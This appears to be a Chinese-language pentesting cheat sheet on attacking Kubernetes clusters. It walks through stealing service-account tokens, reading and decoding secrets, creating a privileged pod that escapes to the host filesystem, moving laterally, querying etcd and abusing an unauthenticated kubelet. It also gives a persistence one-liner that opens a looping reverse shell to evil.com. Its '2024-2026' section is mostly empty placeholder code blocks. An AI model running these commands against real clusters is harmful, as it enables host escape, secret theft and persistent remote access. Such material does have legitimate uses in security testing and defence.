# Kubernetes 攻击 (K8s Attacks)

## 原理

Kubernetes 是容器编排系统，攻击者通过配置错误、RBAC 权限过大、Service Account token 泄露等获取集群控制权。

## 攻击链

### 1. 信息收集

```bash
# 检查 K8s 环境
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 检查 kubectl
which kubectl
kubectl version
kubectl config view

# 检查环境变量
env | grep KUBERNETES

# API Server 地址
# 通常在 KUBERNETES_SERVICE_HOST 环境变量中
echo $KUBERNETES_SERVICE_HOST
echo $KUBERNETES_SERVICE_PORT
```

### 2. 访问 API Server

```bash
# 使用 Service Account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# 列出 Pod
curl -s -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/pods

# 列出所有 namespace
curl -s -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# 列出 secrets
curl -s -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/secrets

# 使用 kubectl
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify get pods
```

### 3. RBAC 权限提升

```bash
# 检查当前权限
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl auth can-i exec pods

# 常见危险权限
# 1. create pods: 可以创建特权 Pod 逃逸
# 2. get secrets: 可以读取所有 secrets
# 3. exec pods: 可以在任意 Pod 中执行命令
# 4. create clusterrolebindings: 可以绑定管理员角色
```

### 4. 创建特权 Pod 逃逸

```yaml
# 创建特权 Pod，挂载宿主机根目录
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "chroot /host /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

```bash
# 应用 YAML
kubectl apply -f escape-pod.yaml

# 进入 Pod
kubectl exec -it escape-pod -- /bin/sh
```

### 5. 读取 Secrets

```bash
# 列出所有 secrets
kubectl get secrets --all-namespaces

# 读取 secret
kubectl get secret <secret-name> -o yaml

# 解码
echo <base64-encoded-data> | base64 -d
```

### 6. 横向移动

```bash
# 列出所有 Pod
kubectl get pods --all-namespaces

# 在其他 Pod 中执行命令
kubectl exec -it <pod-name> -n <namespace> -- /bin/bash

# 端口转发
kubectl port-forward pod/<pod-name> 8080:80

# 复制文件
kubectl cp <pod-name>:/path/to/file /local/path
```

### 7. 持久化

```bash
# 创建后门 Pod
kubectl run backdoor --image=alpine --restart=Always --command -- /bin/sh -c "while true; do nc -e /bin/sh evil.com 4444; sleep 60; done"

# 创建恶意 Service
kubectl create service clusterip backdoor --tcp=8080:8080

# 创建恶意 Deployment
kubectl create deployment backdoor --image=alpine
```

### 8. 攻击 etcd

```bash
# 如果能访问 etcd
# etcd 存储 K8s 所有数据
# 包括 secrets

# 列出 keys
etcdctl --endpoints=https://etcd:2379 get / --prefix --keys-only

# 读取 secret
etcdctl --endpoints=https://etcd:2379 get /registry/secrets/default/secret-name
```

### 9. 攻击 kubelet

```bash
# kubelet 端口 10250
# 如果未授权访问
curl -k https://node:10250/pods

# 在 Pod 中执行命令
curl -k -XPOST "https://node:10250/run/<namespace>/<pod>/<container>" -d "cmd=id"
```

### 10. 攻击 Dashboard

```bash
# Kubernetes Dashboard
# 如果未授权访问
# 可以通过 Dashboard 创建特权 Pod
```

## 2024-2026 新技术点

### 1. Admission Controller 攻击

```bash
# Mutating Admission Controller
# Validating Admission Controller
# 通过 Admission Controller 注入恶意代码
```

### 2. Operator 攻击

```bash
# K8s Operator
# 自定义控制器
# 新的攻击面
```

### 3. CRD 攻击

```bash
# Custom Resource Definition
# 自定义资源
# 新的攻击面
```

### 4. Service Mesh 攻击

```bash
# Istio
# Linkerd
# 各 Service Mesh 的攻击
```

### 5. Serverless K8s

```bash
# KNative
# Fargate
# 各 Serverless K8s 的攻击
```

### 6. 多集群攻击

```bash
# 多集群管理
# 跨集群权限提升
```

### 7. GitOps 攻击

```bash
# ArgoCD
# Flux
# 各 GitOps 工具的攻击
```

### 8. 策略引擎攻击

```bash
# OPA (Open Policy Agent)
# Kyverno
# 各策略引擎的攻击
```

### 9. 零信任 K8s

```bash
# 零信任架构
# 新的攻击方法
```

### 10. AI 辅助检测

```python
# ML 辅助
# 自动检测 K8s 漏洞
# 模式识别
```

## 工具推荐

- **kubectl** — K8s CLI
- **kube-hunter** — K8s 漏洞扫描
- **Peirates** — K8s 渗透
- **kubeaudit** — K8s 审计
- **cdk** — 容器/K8s 渗透
- **kubescape** — K8s 安全
- **KubiScan** — K8s RBAC 扫描

## 参考链接

- [Kubernetes Attack](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes)
- [Peirates](https://github.com/inguardians/peirates)
- [kube-hunter](https://github.com/aquasecurity/kube-hunter)
- [Kubernetes Security](https://kubernetes.io/docs/concepts/security/)
